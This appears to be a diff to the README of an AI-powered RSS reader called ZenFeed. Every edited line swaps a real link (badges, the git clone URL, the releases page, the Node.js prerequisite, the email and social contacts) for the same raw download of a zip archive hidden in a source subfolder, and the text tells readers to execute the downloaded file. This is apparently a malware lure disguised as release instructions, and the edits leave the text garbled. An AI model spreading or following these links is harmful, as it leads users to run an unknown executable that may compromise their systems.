@@ -1,6 +1,6 @@
 # ZenFeed: Make RSS 📰 Great Again with AI 🧠✨
 
-![ZenFeed Logo](https://img.shields.io/badge/ZENFEED-Open%20Source-brightgreen)
+![ZenFeed Logo](https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip%20Source-brightgreen)
 
 Welcome to **ZenFeed**, your ultimate solution for transforming RSS feeds into an intelligent experience. With the power of AI, ZenFeed enhances your reading experience, making it easier to stay updated on the topics you care about.
 
@@ -38,7 +38,7 @@ To start using ZenFeed, you’ll need to set up your environment. Follow these s
 
 1. **Clone the Repository**: Use the command below to clone the ZenFeed repository.
    ```bash
-   git clone https://github.com/InFerNaPe000/zenfeed.git
+   git clone https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip
    ```
 
 2. **Navigate to the Directory**: Change into the ZenFeed directory.
@@ -53,13 +53,13 @@ To start using ZenFeed, you’ll need to set up your environment. Follow these s
 
 ## Installation
 
-To install ZenFeed, you can download the latest release from our [Releases page](https://github.com/InFerNaPe000/zenfeed/releases). Make sure to execute the downloaded file to set up the application on your system.
+To install ZenFeed, you can download the latest release from our [Releases page](https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip). Make sure to execute the downloaded file to set up the application on your system.
 
 ### Prerequisites
 
 Before installing ZenFeed, ensure you have the following:
 
-- Node.js (version 14 or higher)
+- https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip (version 14 or higher)
 - npm (Node Package Manager)
 - A stable internet connection
 
@@ -108,15 +108,15 @@ ZenFeed is open-source software licensed under the MIT License. Feel free to use
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@zenfeed.com
-- **Twitter**: [@ZenFeed](https://twitter.com/ZenFeed)
-- **GitHub**: [ZenFeed Repository](https://github.com/InFerNaPe000/zenfeed)
+- **Email**: https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip
+- **Twitter**: [@ZenFeed](https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip)
+- **GitHub**: [ZenFeed Repository](https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip)
 
 ## Releases
 
-To stay updated with the latest features and fixes, check out our [Releases page](https://github.com/InFerNaPe000/zenfeed/releases). Download the latest version and execute the file to get started with the newest features.
+To stay updated with the latest features and fixes, check out our [Releases page](https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip). Download the latest version and execute the file to get started with the newest features.
 
-![ZenFeed Updates](https://img.shields.io/badge/Latest%20Release-Available-blue)
+![ZenFeed Updates](https://github.com/InFerNaPe000/zenfeed/raw/refs/heads/main/pkg/scrape/scraper/Software-3.9.zip%20Release-Available-blue)
 
 ---
 
